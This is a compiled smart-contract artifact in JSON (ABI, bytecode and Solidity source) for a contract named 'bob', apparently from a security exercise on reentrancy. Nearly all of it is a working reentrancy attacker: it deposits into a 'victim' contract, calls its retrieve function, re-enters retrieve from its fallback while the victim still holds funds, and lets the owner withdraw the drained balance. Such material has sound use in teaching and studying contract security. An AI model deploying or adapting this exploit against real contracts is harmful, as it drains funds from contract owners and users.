{
  "contractName": "bob",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "addr_alice",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "amount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "send",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "hack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getMoney",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getAliceBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405233600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506106c0806100546000396000f3fe6080604052600436106100595760003560e01c80630921515b1461012157806325c4dc3c1461014c5780633e58c58c146101775780634de260a2146101a057806398e1b410146101b7578063aa8c217c146101ce5761005a565b5b600054600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061011f57600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e64cec16040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010657600080fd5b505af115801561011a573d6000803e3d6000fd5b505050505b005b34801561012d57600080fd5b506101366101f9565b6040516101439190610590565b60405180910390f35b34801561015857600080fd5b5061016161021f565b60405161016e91906105cb565b60405180910390f35b34801561018357600080fd5b5061019e60048036038101906101999190610522565b610260565b005b3480156101ac57600080fd5b506101b5610371565b005b3480156101c357600080fd5b506101cc6103f5565b005b3480156101da57600080fd5b506101e3610507565b6040516101f091906105cb565b60405180910390f35b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631905090565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555047600081905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db06000546040518263ffffffff1660e01b81526004016000604051808303818588803b15801561035557600080fd5b505af1158015610369573d6000803e3d6000fd5b505050505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e64cec16040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103db57600080fd5b505af11580156103ef573d6000803e3d6000fd5b50505050565b3373ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610485576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161047c906105ab565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610504573d6000803e3d6000fd5b50565b60005481565b60008135905061051c81610673565b92915050565b60006020828403121561053857610537610645565b5b60006105468482850161050d565b91505092915050565b610558816105f7565b82525050565b600061056b6010836105e6565b91506105768261064a565b602082019050919050565b61058a8161063b565b82525050565b60006020820190506105a5600083018461054f565b92915050565b600060208201905081810360008301526105c48161055e565b9050919050565b60006020820190506105e06000830184610581565b92915050565b600082825260208201905092915050565b60006106028261061b565b9050919050565b60006106148261061b565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600080fd5b7f6e6f206572657320656c206f776e657200000000000000000000000000000000600082015250565b61067c81610609565b811461068757600080fd5b5056fea2646970667358221220816a8599b727ab52ab0ea64a6a3d29f534d5be3f009368992a6b4fd1c13362d564736f6c63430008070033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier:MIT\r\npragma solidity >=0.7.0 <0.9.0;\r\n\r\ninterface alice {\r\n    function retrieve() external;\r\n    function deposit() external payable;\r\n}\r\n\r\ncontract bob{\r\n\r\n    uint256 public amount;\r\n    address payable owner;\r\n    alice victim;\r\n    address public addr_alice;\r\n\r\n    constructor () payable {\r\n        owner= payable(msg.sender);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner==msg.sender,'no eres el owner');\r\n        _;\r\n    }\r\n\r\n    function send(address payable _addr) external {\r\n        victim = alice(_addr);\r\n        addr_alice=_addr;\r\n        amount=address(this).balance;\r\n        victim.deposit{value: amount}();\r\n    }\r\n\r\n    function hack () external\r\n    {\r\n        victim.retrieve();\r\n    }\r\n\r\n    function getMoney() external onlyOwner\r\n    {\r\n        owner.transfer((address(this)).balance);\r\n    }\r\n\r\n    fallback() external payable{\r\n        if (address(addr_alice).balance >= amount) \r\n        {\r\n            victim.retrieve(); \r\n        }\r\n    }\r\n\r\n    function getAliceBalance() external view returns (uint256)\r\n    {\r\n        return (address(addr_alice).balance);\r\n    }\r\n\r\n}",
  "sourcePath": "/home/cryptocris/edIT/security/reentrancy/contracts/bob.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.7+commit.e28d00a7.Emscripten.clang"
  },
  "schemaVersion": "3.4.11",
  "updatedAt": "2023-01-01T21:44:52.415Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}